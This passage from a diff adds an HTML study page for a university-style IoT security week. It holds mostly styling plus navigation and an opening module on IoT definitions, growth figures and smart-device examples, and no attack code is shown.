@@ -1,0 +1,2785 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Week 11: IoT Security — Interactive Revision & Exploit Lab</title>
+<style>
+  :root {
+    --bg-primary: #0a0f1c;
+    --bg-secondary: #111827;
+    --bg-card: #162033;
+    --bg-card-hover: #1d2a42;
+    --border-color: #26354d;
+    --text-primary: #f1f5f9;
+    --text-secondary: #94a3b8;
+    --text-muted: #64748b;
+    --accent-cyan: #06b6d4;
+    --accent-cyan-glow: rgba(6, 182, 212, 0.25);
+    --accent-emerald: #10b981;
+    --accent-emerald-glow: rgba(16, 185, 129, 0.2);
+    --accent-amber: #f59e0b;
+    --accent-amber-glow: rgba(245, 158, 11, 0.2);
+    --accent-coral: #f43f5e;
+    --accent-coral-glow: rgba(244, 63, 94, 0.25);
+    --accent-purple: #8b5cf6;
+    --font-sans: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+    --font-mono: 'JetBrains Mono', 'Fira Code', 'SFMono-Regular', Consolas, monospace;
+    --radius-sm: 6px;
+    --radius-md: 12px;
+    --radius-lg: 16px;
+  }
+
+  * {
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+  }
+
+  body {
+    font-family: var(--font-sans);
+    background-color: var(--bg-primary);
+    color: var(--text-primary);
+    line-height: 1.6;
+    overflow-x: hidden;
+    display: flex;
+    min-height: 100vh;
+  }
+
+  /* Custom Scrollbar */
+  ::-webkit-scrollbar {
+    width: 8px;
+    height: 8px;
+  }
+  ::-webkit-scrollbar-track {
+    background: var(--bg-primary);
+  }
+  ::-webkit-scrollbar-thumb {
+    background: var(--border-color);
+    border-radius: 4px;
+  }
+  ::-webkit-scrollbar-thumb:hover {
+    background: var(--text-muted);
+  }
+
+  /* Sidebar Navigation */
+  .sidebar {
+    width: 290px;
+    background-color: var(--bg-secondary);
+    border-right: 1px solid var(--border-color);
+    display: flex;
+    flex-direction: column;
+    position: fixed;
+    top: 0;
+    bottom: 0;
+    left: 0;
+    z-index: 50;
+    transition: transform 0.3s ease;
+  }
+
+  .sidebar-header {
+    padding: 1.5rem;
+    border-bottom: 1px solid var(--border-color);
+  }
+
+  .course-badge {
+    display: inline-flex;
+    align-items: center;
+    gap: 6px;
+    font-family: var(--font-mono);
+    font-size: 0.72rem;
+    font-weight: 700;
+    text-transform: uppercase;
+    letter-spacing: 0.08em;
+    color: var(--accent-cyan);
+    background: var(--accent-cyan-glow);
+    padding: 4px 10px;
+    border-radius: 999px;
+    border: 1px solid rgba(6, 182, 212, 0.3);
+    margin-bottom: 0.65rem;
+  }
+
+  .sidebar-title {
+    font-size: 1.15rem;
+    font-weight: 700;
+    line-height: 1.3;
+    color: var(--text-primary);
+  }
+
+  .sidebar-subtitle {
+    font-size: 0.8rem;
+    color: var(--text-secondary);
+    margin-top: 0.25rem;
+  }
+
+  /* Progress Tracker */
+  .progress-box {
+    padding: 1rem 1.5rem;
+    border-bottom: 1px solid var(--border-color);
+    background: rgba(15, 23, 42, 0.4);
+  }
+
+  .progress-header {
+    display: flex;
+    justify-content: space-between;
+    font-size: 0.78rem;
+    font-weight: 600;
+    color: var(--text-secondary);
+    margin-bottom: 0.45rem;
+  }
+
+  .progress-bar-bg {
+    width: 100%;
+    height: 7px;
+    background: var(--bg-primary);
+    border-radius: 999px;
+    overflow: hidden;
+    border: 1px solid var(--border-color);
+  }
+
+  .progress-bar-fill {
+    height: 100%;
+    width: 20%;
+    background: linear-gradient(90deg, var(--accent-cyan), var(--accent-emerald));
+    border-radius: 999px;
+    transition: width 0.4s cubic-bezier(0.22, 1, 0.36, 1);
+  }
+
+  .nav-list {
+    list-style: none;
+    padding: 1rem 0.75rem;
+    flex: 1;
+    overflow-y: auto;
+    display: flex;
+    flex-direction: column;
+    gap: 0.35rem;
+  }
+
+  .nav-btn {
+    width: 100%;
+    display: flex;
+    align-items: flex-start;
+    gap: 0.75rem;
+    padding: 0.85rem 0.95rem;
+    border-radius: var(--radius-md);
+    border: 1px solid transparent;
+    background: transparent;
+    color: var(--text-secondary);
+    text-align: left;
+    cursor: pointer;
+    transition: all 0.2s ease;
+    font-family: inherit;
+  }
+
+  .nav-btn:hover {
+    background: var(--bg-card);
+    color: var(--text-primary);
+  }
+
+  .nav-btn.active {
+    background: linear-gradient(135deg, rgba(6, 182, 212, 0.14), rgba(16, 185, 129, 0.08));
+    border-color: rgba(6, 182, 212, 0.45);
+    color: var(--text-primary);
+    box-shadow: 0 4px 16px rgba(0, 0, 0, 0.25);
+  }
+
+  .nav-num {
+    flex-shrink: 0;
+    width: 24px;
+    height: 24px;
+    border-radius: 6px;
+    background: var(--bg-primary);
+    border: 1px solid var(--border-color);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-family: var(--font-mono);
+    font-size: 0.75rem;
+    font-weight: 700;
+    color: var(--text-secondary);
+    margin-top: 1px;
+  }
+
+  .nav-btn.active .nav-num {
+    background: var(--accent-cyan);
+    color: #06131c;
+    border-color: var(--accent-cyan);
+  }
+
+  .nav-btn.completed .nav-num {
+    background: var(--accent-emerald);
+    color: #041d15;
+    border-color: var(--accent-emerald);
+  }
+
+  .nav-info {
+    display: flex;
+    flex-direction: column;
+  }
+
+  .nav-title {
+    font-size: 0.88rem;
+    font-weight: 600;
+    line-height: 1.3;
+  }
+
+  .nav-sub {
+    font-size: 0.73rem;
+    color: var(--text-muted);
+    margin-top: 2px;
+  }
+
+  .sidebar-footer {
+    padding: 1rem 1.25rem;
+    border-top: 1px solid var(--border-color);
+  }
+
+  .download-btn {
+    width: 100%;
+    padding: 0.7rem 1rem;
+    border-radius: var(--radius-md);
+    border: 1px solid rgba(6, 182, 212, 0.4);
+    background: rgba(6, 182, 212, 0.12);
+    color: var(--accent-cyan);
+    font-family: var(--font-sans);
+    font-size: 0.83rem;
+    font-weight: 600;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    transition: all 0.2s ease;
+  }
+
+  .download-btn:hover {
+    background: var(--accent-cyan);
+    color: #06131c;
+    box-shadow: 0 0 18px var(--accent-cyan-glow);
+  }
+
+  /* Mobile Header */
+  .mobile-topbar {
+    display: none;
+    position: fixed;
+    top: 0;
+    left: 0;
+    right: 0;
+    height: 60px;
+    background: var(--bg-secondary);
+    border-bottom: 1px solid var(--border-color);
+    padding: 0 1rem;
+    align-items: center;
+    justify-content: space-between;
+    z-index: 45;
+  }
+
+  .hamburger-btn {
+    background: var(--bg-card);
+    border: 1px solid var(--border-color);
+    color: var(--text-primary);
+    padding: 8px 12px;
+    border-radius: var(--radius-sm);
+    cursor: pointer;
+    font-size: 1.1rem;
+  }
+
+  .sidebar-backdrop {
+    display: none;
+    position: fixed;
+    inset: 0;
+    background: rgba(0, 0, 0, 0.65);
+    z-index: 48;
+  }
+
+  /* Main Content Area */
+  .main-content {
+    margin-left: 290px;
+    flex: 1;
+    padding: 2.25rem 2.75rem 4rem;
+    max-width: 1220px;
+  }
+
+  .module-section {
+    display: none;
+    animation: fadeSlideIn 0.32s ease-out;
+  }
+
+  .module-section.active {
+    display: block;
+  }
+
+  @keyframes fadeSlideIn {
+    from {
+      opacity: 0;
+      transform: translateY(10px);
+    }
+    to {
+      opacity: 1;
+      transform: translateY(0);
+    }
+  }
+
+  .module-header {
+    margin-bottom: 2rem;
+    padding-bottom: 1.25rem;
+    border-bottom: 1px solid var(--border-color);
+    display: flex;
+    flex-wrap: wrap;
+    justify-content: space-between;
+    align-items: flex-end;
+    gap: 1rem;
+  }
+
+  .module-eyebrow {
+    font-family: var(--font-mono);
+    font-size: 0.78rem;
+    font-weight: 700;
+    color: var(--accent-cyan);
+    text-transform: uppercase;
+    letter-spacing: 0.08em;
+    margin-bottom: 0.35rem;
+  }
+
+  .module-title {
+    font-size: 1.85rem;
+    font-weight: 800;
+    letter-spacing: -0.02em;
+    color: var(--text-primary);
+  }
+
+  .module-desc {
+    color: var(--text-secondary);
+    font-size: 0.96rem;
+    max-width: 740px;
+    margin-top: 0.45rem;
+  }
+
+  /* Cards & Grid Utilities */
+  .card {
+    background: var(--bg-card);
+    border: 1px solid var(--border-color);
+    border-radius: var(--radius-lg);
+    padding: 1.5rem;
+    box-shadow: 0 8px 24px rgba(0, 0, 0, 0.2);
+    margin-bottom: 1.75rem;
+  }
+
+  .card-header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    flex-wrap: wrap;
+    gap: 0.75rem;
+    margin-bottom: 1.15rem;
+  }
+
+  .card-title {
+    font-size: 1.15rem;
+    font-weight: 700;
+    color: var(--text-primary);
+    display: flex;
+    align-items: center;
+    gap: 0.55rem;
+  }
+
+  .tag {
+    font-family: var(--font-mono);
+    font-size: 0.72rem;
+    font-weight: 600;
+    padding: 3px 9px;
+    border-radius: 6px;
+    text-transform: uppercase;
+  }
+
+  .tag-cyan { background: var(--accent-cyan-glow); color: var(--accent-cyan); border: 1px solid rgba(6, 182, 212, 0.35); }
+  .tag-emerald { background: var(--accent-emerald-glow); color: var(--accent-emerald); border: 1px solid rgba(16, 185, 129, 0.35); }
+  .tag-amber { background: var(--accent-amber-glow); color: var(--accent-amber); border: 1px solid rgba(245, 158, 11, 0.35); }
+  .tag-coral { background: var(--accent-coral-glow); color: var(--accent-coral); border: 1px solid rgba(244, 63, 94, 0.35); }
+
+  .grid-2 {
+    display: grid;
+    grid-template-columns: repeat(2, 1fr);
+    gap: 1.25rem;
+  }
+
+  .grid-3 {
+    display: grid;
+    grid-template-columns: repeat(3, 1fr);
+    gap: 1.25rem;
+  }
+
+  /* Key Concept Highlights */
+  .concept-pill-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+    gap: 1rem;
+    margin-bottom: 1.5rem;
+  }
+
+  .concept-box {
+    background: rgba(15, 23, 42, 0.65);
+    border: 1px solid var(--border-color);
+    border-left: 3px solid var(--accent-cyan);
+    border-radius: var(--radius-md);
+    padding: 1rem 1.15rem;
+  }
+
+  .concept-box.emerald { border-left-color: var(--accent-emerald); }
+  .concept-box.amber { border-left-color: var(--accent-amber); }
+  .concept-box.coral { border-left-color: var(--accent-coral); }
+
+  .concept-box h4 {
+    font-size: 0.92rem;
+    font-weight: 700;
+    margin-bottom: 0.35rem;
+    color: var(--text-primary);
+  }
+
+  .concept-box p {
+    font-size: 0.85rem;
+    color: var(--text-secondary);
+  }
+
+  /* Canvas & SVG Containers */
+  .viz-container {
+    background: #0b1120;
+    border: 1px solid var(--border-color);
+    border-radius: var(--radius-md);
+    padding: 1rem;
+    position: relative;
+    overflow: hidden;
+  }
+
+  canvas {
+    display: block;
+    width: 100%;
+    border-radius: 8px;
+  }
+
+  /* Product Showcase Cards */
+  .product-card {
+    background: rgba(15, 23, 42, 0.7);
+    border: 1px solid var(--border-color);
+    border-radius: var(--radius-md);
+    padding: 1.25rem;
+    cursor: pointer;
+    transition: all 0.25s ease;
+    display: flex;
+    flex-direction: column;
+    justify-content: space-between;
+  }
+
+  .product-card:hover, .product-card.selected {
+    border-color: var(--accent-cyan);
+    background: var(--bg-card-hover);
+    transform: translateY(-2px);
+    box-shadow: 0 6px 20px rgba(6, 182, 212, 0.15);
+  }
+
+  .product-icon {
+    width: 44px;
+    height: 44px;
+    border-radius: 10px;
+    background: rgba(6, 182, 212, 0.14);
+    border: 1px solid rgba(6, 182, 212, 0.3);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    color: var(--accent-cyan);
+    margin-bottom: 0.9rem;
+  }
+
+  .telemetry-drawer {
+    margin-top: 1rem;
+    padding: 1rem 1.25rem;
+    background: #0b1120;
+    border: 1px solid rgba(6, 182, 212, 0.35);
+    border-radius: var(--radius-md);
+    font-family: var(--font-mono);
+    font-size: 0.82rem;
+  }
+
+  /* Domain Filter Tabs */
+  .filter-bar {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 0.5rem;
+    margin-bottom: 1.25rem;
+  }
+
+  .filter-btn {
+    padding: 0.55rem 0.95rem;
+    border-radius: 999px;
+    border: 1px solid var(--border-color);
+    background: var(--bg-primary);
+    color: var(--text-secondary);
+    font-size: 0.82rem;
+    font-weight: 600;
+    cursor: pointer;
+    transition: all 0.2s ease;
+  }
+
+  .filter-btn:hover {
+    border-color: var(--accent-cyan);
+    color: var(--text-primary);
+  }
+
+  .filter-btn.active {
+    background: var(--accent-cyan);
+    color: #06131c;
+    border-color: var(--accent-cyan);
+  }
+
+  /* Interactive Step Chain (Jeep Hack) */
+  .attack-chain {
+    display: grid;
+    grid-template-columns: repeat(4, 1fr);
+    gap: 0.85rem;
+    margin-bottom: 1.25rem;
+  }
+
+  .chain-step {
+    background: #0b1120;
+    border: 1px solid var(--border-color);
+    border-radius: var(--radius-md);
+    padding: 1rem;
+    cursor: pointer;
+    position: relative;
+    transition: all 0.25s ease;
+  }
+
+  .chain-step.active {
+    border-color: var(--accent-coral);
+    background: rgba(244, 63, 94, 0.1);
+    box-shadow: 0 0 20px rgba(244, 63, 94, 0.18);
+  }
+
+  .chain-step-num {
+    font-family: var(--font-mono);
+    font-size: 0.72rem;
+    color: var(--accent-coral);
+    font-weight: 700;
+    margin-bottom: 0.25rem;
+  }
+
+  .chain-detail-panel {
+    background: #0b1120;
+    border: 1px solid rgba(244, 63, 94, 0.35);
+    border-radius: var(--radius-md);
+    padding: 1.25rem;
+  }
+
+  /* Mirai Timeline & Stats */
+  .stat-banner {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+    gap: 1rem;
+    margin-bottom: 1.25rem;
+  }
+
+  .stat-box {
+    background: #0b1120;
+    border: 1px solid var(--border-color);
+    border-radius: var(--radius-md);
+    padding: 1.1rem;
+    text-align: center;
+  }
+
+  .stat-value {
+    font-family: var(--font-mono);
+    font-size: 1.65rem;
+    font-weight: 800;
+    color: var(--accent-amber);
+  }
+
+  .stat-value.coral { color: var(--accent-coral); }
+  .stat-value.cyan { color: var(--accent-cyan); }
+  .stat-value.emerald { color: var(--accent-emerald); }
+
+  .stat-label {
+    font-size: 0.8rem;
+    color: var(--text-secondary);
+    margin-top: 0.25rem;
+  }
+
+  .variant-chips {
+    display: flex;
+    flex-wrap: wrap;
+    gap: 0.5rem;
+    margin-top: 0.65rem;
+  }
+
+  .variant-chip {
+    font-family: var(--font-mono);
+    font-size: 0.78rem;
+    padding: 4px 10px;
+    background: rgba(245, 158, 11, 0.12);
+    border: 1px solid rgba(245, 158, 11, 0.35);
+    color: var(--accent-amber);
+    border-radius: 6px;
+  }
+
+  /* Vulnerability Matcher (Module 3) */
+  .matcher-grid {
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 1.5rem;
+    align-items: start;
+  }
+
+  .match-col {
+    display: flex;
+    flex-direction: column;
+    gap: 0.65rem;
+  }
+
+  .match-item {
+    padding: 0.9rem 1.1rem;
+    background: #0b1120;
+    border: 1px solid var(--border-color);
+    border-radius: var(--radius-md);
+    cursor: pointer;
+    font-size: 0.88rem;
+    font-weight: 600;
+    transition: all 0.2s ease;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+  }
+
+  .match-item:hover {
+    border-color: var(--accent-cyan);
+  }
+
+  .match-item.selected {
+    border-color: var(--accent-amber);
+    background: rgba(245, 158, 11, 0.14);
+    color: var(--accent-amber);
+  }
+
+  .match-item.matched {
+    border-color: var(--accent-emerald);
+    background: rgba(16, 185, 129, 0.14);
+    color: var(--accent-emerald);
+    cursor: default;
+  }
+
+  .match-item.wrong {
+    border-color: var(--accent-coral);
+    background: rgba(244, 63, 94, 0.16);
+    animation: shake 0.35s ease;
+  }
+
+  @keyframes shake {
+    0%, 100% { transform: translateX(0); }
+    25% { transform: translateX(-6px); }
+    75% { transform: translateX(6px); }
+  }
+
+  /* Accordion (Fortinet 5 Challenges) */
+  .accordion-item {
+    border: 1px solid var(--border-color);
+    border-radius: var(--radius-md);
+    background: #0b1120;
+    margin-bottom: 0.75rem;
+    overflow: hidden;
+  }
+
+  .accordion-header {
+    width: 100%;
+    padding: 1rem 1.25rem;
+    background: transparent;
+    border: none;
+    color: var(--text-primary);
+    font-family: var(--font-sans);
+    font-size: 0.95rem;
+    font-weight: 700;
+    text-align: left;
+    cursor: pointer;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    transition: background 0.2s ease;
+  }
+
+  .accordion-header:hover {
+    background: rgba(255, 255, 255, 0.03);
+  }
+
+  .accordion-body {
+    max-height: 0;
+    overflow: hidden;
+    transition: max-height 0.3s ease, padding 0.3s ease;
+    padding: 0 1.25rem;
+    color: var(--text-secondary);
+    font-size: 0.88rem;
+    border-top: 1px solid transparent;
+  }
+
+  .accordion-item.open .accordion-body {
+    max-height: 260px;
+    padding: 1rem 1.25rem 1.2rem;
+    border-top-color: var(--border-color);
+  }
+
+  .accordion-chevron {
+    transition: transform 0.25s ease;
+    color: var(--accent-cyan);
+    font-family: var(--font-mono);
+  }
+
+  .accordion-item.open .accordion-chevron {
+    transform: rotate(180deg);
+  }
+
+  /* Buffer Overflow Simulator (Module 4) */
+  .tab-bar {
+    display: flex;
+    gap: 0.5rem;
+    border-bottom: 1px solid var(--border-color);
+    padding-bottom: 0.75rem;
+    margin-bottom: 1.25rem;
+    flex-wrap: wrap;
+  }
+
+  .tab-btn {
+    padding: 0.5rem 1rem;
+    border-radius: var(--radius-sm);
+    border: 1px solid var(--border-color);
+    background: #0b1120;
+    color: var(--text-secondary);
+    font-size: 0.84rem;
+    font-weight: 600;
+    cursor: pointer;
+    transition: all 0.2s ease;
+  }
+
+  .tab-btn.active {
+    background: rgba(6, 182, 212, 0.16);
+    border-color: var(--accent-cyan);
+    color: var(--accent-cyan);
+  }
+
+  .ram-cells {
+    display: grid;
+    grid-template-columns: repeat(16, 1fr);
+    gap: 4px;
+    margin: 1rem 0;
+  }
+
+  .ram-cell {
+    aspect-ratio: 1;
+    border-radius: 4px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-family: var(--font-mono);
+    font-size: 0.72rem;
+    font-weight: 700;
+    border: 1px solid var(--border-color);
+    background: #111827;
+    color: var(--text-muted);
+    transition: all 0.15s ease;
+  }
+
+  .ram-cell.buffer-zone {
+    border-color: rgba(6, 182, 212, 0.45);
+  }
+
+  .ram-cell.pointer-zone {
+    border-color: rgba(245, 158, 11, 0.6);
+    background: rgba(245, 158, 11, 0.08);
+  }
+
+  .ram-cell.filled-safe {
+    background: var(--accent-cyan);
+    color: #06131c;
+    border-color: var(--accent-cyan);
+  }
+
+  .ram-cell.filled-overflow {
+    background: var(--accent-coral);
+    color: #ffffff;
+    border-color: var(--accent-coral);
+    box-shadow: 0 0 10px var(--accent-coral-glow);
+  }
+
+  /* Device Harvesting Matrix */
+  .device-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(155px, 1fr));
+    gap: 0.85rem;
+    margin-bottom: 1.15rem;
+  }
+
+  .device-btn {
+    padding: 1rem 0.75rem;
+    background: #0b1120;
+    border: 1px solid var(--border-color);
+    border-radius: var(--radius-md);
+    color: var(--text-secondary);
+    cursor: pointer;
+    text-align: center;
+    transition: all 0.2s ease;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 0.5rem;
+  }
+
+  .device-btn:hover, .device-btn.active {
+    border-color: var(--accent-coral);
+    background: rgba(244, 63, 94, 0.1);
+    color: var(--text-primary);
+  }
+
+  .device-btn svg {
+    color: var(--accent-cyan);
+  }
+
+  .device-btn.active svg {
+    color: var(--accent-coral);
+  }
+
+  /* Quiz Styling (Module 5) */
+  .quiz-question-card {
+    background: #0b1120;
+    border: 1px solid var(--border-color);
+    border-radius: var(--radius-md);
+    padding: 1.35rem;
+    margin-bottom: 1.25rem;
+  }
+
+  .quiz-q-title {
+    font-size: 1rem;
+    font-weight: 700;
+    margin-bottom: 0.9rem;
+    color: var(--text-primary);
+  }
+
+  .quiz-options {
+    display: flex;
+    flex-direction: column;
+    gap: 0.55rem;
+  }
+
+  .quiz-opt {
+    padding: 0.8rem 1rem;
+    border-radius: var(--radius-sm);
+    border: 1px solid var(--border-color);
+    background: var(--bg-secondary);
+    color: var(--text-primary);
+    text-align: left;
+    font-family: inherit;
+    font-size: 0.88rem;
+    cursor: pointer;
+    transition: all 0.18s ease;
+    display: flex;
+    align-items: center;
+    gap: 0.65rem;
+  }
+
+  .quiz-opt:hover:not(:disabled) {
+    border-color: var(--accent-cyan);
+    background: var(--bg-card-hover);
+  }
+
+  .quiz-opt.correct {
+    border-color: var(--accent-emerald);
+    background: rgba(16, 185, 129, 0.18);
+    color: #ecfdf5;
+  }
+
+  .quiz-opt.incorrect {
+    border-color: var(--accent-coral);
+    background: rgba(244, 63, 94, 0.18);
+    color: #fff1f2;
+  }
+
+  .quiz-feedback {
+    margin-top: 0.75rem;
+    padding: 0.75rem 1rem;
+    border-radius: var(--radius-sm);
+    font-size: 0.84rem;
+    display: none;
+  }
+
+  .quiz-feedback.show {
+    display: block;
+  }
+
+  /* Module Footer Navigation */
+  .module-footer-nav {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-top: 2.25rem;
+    padding-top: 1.25rem;
+    border-top: 1px solid var(--border-color);
+    gap: 1rem;
+  }
+
+  .btn-primary, .btn-secondary {
+    padding: 0.75rem 1.35rem;
+    border-radius: var(--radius-md);
+    font-family: var(--font-sans);
+    font-size: 0.88rem;
+    font-weight: 600;
+    cursor: pointer;
+    transition: all 0.2s ease;
+    display: inline-flex;
+    align-items: center;
+    gap: 8px;
+  }
+
+  .btn-primary {
+    background: var(--accent-cyan);
+    color: #06131c;
+    border: 1px solid var(--accent-cyan);
+  }
+
+  .btn-primary:hover {
+    background: #22d3ee;
+    box-shadow: 0 0 18px var(--accent-cyan-glow);
+  }
+
+  .btn-secondary {
+    background: var(--bg-card);
+    color: var(--text-primary);
+    border: 1px solid var(--border-color);
+  }
+
+  .btn-secondary:hover {
+    border-color: var(--accent-cyan);
+  }
+
+  /* Toast Notification */
+  .toast {
+    position: fixed;
+    bottom: 24px;
+    right: 24px;
+    background: var(--bg-card);
+    border: 1px solid var(--accent-emerald);
+    color: var(--text-primary);
+    padding: 0.85rem 1.25rem;
+    border-radius: var(--radius-md);
+    box-shadow: 0 10px 30px rgba(0, 0, 0, 0.45);
+    font-size: 0.85rem;
+    font-weight: 600;
+    z-index: 100;
+    transform: translateY(120%);
+    opacity: 0;
+    transition: all 0.3s ease;
+  }
+
+  .toast.show {
+    transform: translateY(0);
+    opacity: 1;
+  }
+
+  /* Responsive Breakpoints */
+  @media (max-width: 960px) {
+    .sidebar {
+      transform: translateX(-100%);
+    }
+    .sidebar.open {
+      transform: translateX(0);
+    }
+    .sidebar-backdrop.open {
+      display: block;
+    }
+    .mobile-topbar {
+      display: flex;
+    }
+    .main-content {
+      margin-left: 0;
+      padding: 5.25rem 1.25rem 3rem;
+    }
+    .grid-2, .grid-3, .matcher-grid {
+      grid-template-columns: 1fr;
+    }
+    .attack-chain {
+      grid-template-columns: repeat(2, 1fr);
+    }
+  }
+
+  @media (max-width: 540px) {
+    .attack-chain {
+      grid-template-columns: 1fr;
+    }
+    .ram-cells {
+      grid-template-columns: repeat(8, 1fr);
+    }
+  }
+</style>
+</head>
+<body>
+
+  <!-- Mobile Topbar -->
+  <header class="mobile-topbar">
+    <div style="display:flex;align-items:center;gap:10px;">
+      <button class="hamburger-btn" id="menuToggle" aria-label="Toggle Navigation">☰</button>
+      <span style="font-weight:700;font-size:0.95rem;">Week 11: IoT Security</span>
+    </div>
+    <span class="tag tag-cyan" id="mobileProgressTag">20%</span>
+  </header>
+
+  <div class="sidebar-backdrop" id="sidebarBackdrop"></div>
+
+  <!-- Sidebar Navigation -->
+  <aside class="sidebar" id="sidebar">
+    <div class="sidebar-header">
+      <div class="course-badge">● CYBERSECURITY REVISION</div>
+      <h1 class="sidebar-title">Week 11: IoT Security</h1>
+      <p class="sidebar-subtitle">Introduction to Attack &amp; Exploits</p>
+    </div>
+
+    <div class="progress-box">
+      <div class="progress-header">
+        <span>Study Progress</span>
+        <span id="progressPercent">20%</span>
+      </div>
+      <div class="progress-bar-bg">
+        <div class="progress-bar-fill" id="progressBarFill"></div>
+      </div>
+    </div>
+
+    <ul class="nav-list" id="navList">
+      <li>
+        <button class="nav-btn active" data-module="1">
+          <span class="nav-num">01</span>
+          <div class="nav-info">
+            <span class="nav-title">IoT Fundamentals &amp; Domains</span>
+            <span class="nav-sub">Growth, Products &amp; 5 Domains</span>
+          </div>
+        </button>
+      </li>
+      <li>
+        <button class="nav-btn" data-module="2">
+          <span class="nav-num">02</span>
+          <div class="nav-info">
+            <span class="nav-title">Real-World Attack Cases</span>
+            <span class="nav-sub">Jeep Hack, Mirai &amp; Honeypots</span>
+          </div>
+        </button>
+      </li>
+      <li>
+        <button class="nav-btn" data-module="3">
+          <span class="nav-num">03</span>
+          <div class="nav-info">
+            <span class="nav-title">Attack Mapping &amp; Challenges</span>
+            <span class="nav-sub">Network Recap &amp; Fortinet 5</span>
+          </div>
+        </button>
+      </li>
+      <li>
+        <button class="nav-btn" data-module="4">
+          <span class="nav-num">04</span>
+          <div class="nav-info">
+            <span class="nav-title">Exploit Mechanics &amp; Botnets</span>
+            <span class="nav-sub">Overflow, MitM, C2 &amp; Harvesting</span>
+          </div>
+        </button>
+      </li>
+      <li>
+        <button class="nav-btn" data-module="5">
+          <span class="nav-num">05</span>
+          <div class="nav-info">
+            <span class="nav-title">Exam Readiness Quiz</span>
+            <span class="nav-sub">10 Active Recall Questions</span>
+          </div>
+        </button>
+      </li>
+    </ul>
+
+    <div class="sidebar-footer">
+      <button class="download-btn" id="downloadHtmlBtn">
+        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/></svg>
+        Download HTML File
+      </button>
+    </div>
+  </aside>
+
+  <!-- Main Content -->
+  <main class="main-content">
+
+    <!-- ==================== MODULE 1 ==================== -->
+    <section class="module-section active" id="module-1">
+      <div class="module-header">
+        <div>
+          <div class="module-eyebrow">Module 01 // Architecture &amp; Scope</div>
+          <h2 class="module-title">IoT Fundamentals &amp; Application Domains</h2>
+          <p class="module-desc">Understand how physical objects embedded with sensors, compute, and IP connectivity scale globally across consumer, commercial, industrial, infrastructure, and military sectors.</p>
+        </div>
+        <span class="tag tag-cyan">Foundations</span>
+      </div>
+
+      <!-- Core Definitions -->
+      <div class="concept-pill-grid">
+        <div class="concept-box">
+          <h4>IoT Core Definition</h4>
+          <p>Physical objects ("things") embedded with <strong>sensors</strong>, <strong>processing capability</strong>, and <strong>network connectivity</strong> assigned IP addresses or unique identifiers to collect and exchange data.</p>
+        </div>
+        <div class="concept-box emerald">
+          <h4>Operational Value</h4>
+          <p>Minimizes human intervention and affords greater <strong>machine autonomy</strong>, yielding higher accuracy, operational efficiency, and overall productivity.</p>
+        </div>
+        <div class="concept-box amber">
+          <h4>2025 Scale Multiplier</h4>
+          <p>Connected endpoints surge from <strong>30.73B (2020)</strong> to <strong>75.44B (2025 projection)</strong> — a massive <strong>2.5&times; growth</strong> in just 5 years.</p>
+        </div>
+      </div>
+
+      <!-- Interactive Installed Base Chart -->
+      <div class="card">
+        <div class="card-header">
+          <h3 class="card-title">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="var(--accent-cyan)" stroke-width="2"><polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/></svg>
+            Global IoT Installed Base Growth (Billions of Connected Devices)
+          </h3>
+          <div style="display:flex;gap:8px;align-items:center;">
+            <span class="tag tag-emerald">2.5&times; Growth (2020 &rarr; 2025)</span>
+            <button class="btn-secondary" style="padding:5px 11px;font-size:0.78rem;" id="replayGrowthChart">Replay Animation</button>
+          </div>
+        </div>
+        <div class="viz-container">
+          <canvas id="growthChartCanvas" height="260"></canvas>
+        </div>
+        <p style="font-size:0.82rem;color:var(--text-secondary);margin-top:0.75rem;">
+          <strong>Exam Tip:</strong> Hover or tap over any bar on the chart to inspect exact device counts and growth multipliers (2015: <strong>15.41B</strong> &rarr; 2020: <strong>30.73B</strong> &rarr; 2025P: <strong>75.44B</strong>).
+        </p>
+      </div>
+
+      <!-- Real-World IoT Product Examples -->
+      <div class="card">
+        <div class="card-header">
+          <h3 class="card-title">
+            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="var(--accent-cyan)" stroke-width="2"><rect x="2" y="3" width="20" height="14" rx="2"/><line x1="8" y1="21" x2="16" y2="21"/><line x1="12" y1="17" x2="12" y2="21"/></svg>
+            Real-World IoT Product Examples (Click to Inspect Telemetry)
+          </h3>
+          <span class="tag tag-cyan">Lecture Slide Cases</span>
+        </div>
+
+        <div class="grid-3">
+          <div class="product-card selected" data-product="hitachi">
+            <div>
+              <div class="product-icon">
+                <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="4" y="2" width="16" height="20" rx="2"/><line x1="4" y1="10" x2="20" y2="10"/><line x1="8" y1="6" x2="8" y2="8"/><line x1="8" y1="14" x2="8" y2="17"/></svg>
+              </div>
+              <h4 style="font-size:0.98rem;margin-bottom:0.35rem;">Hitachi R-ZXC740KS / R-ZXC740K</h4>
+              <p style="font-size:0.83rem;color:var(--text-secondary);">Smart consumer refrigerator linked to a smartphone companion mobile app.</p>
+            </div>
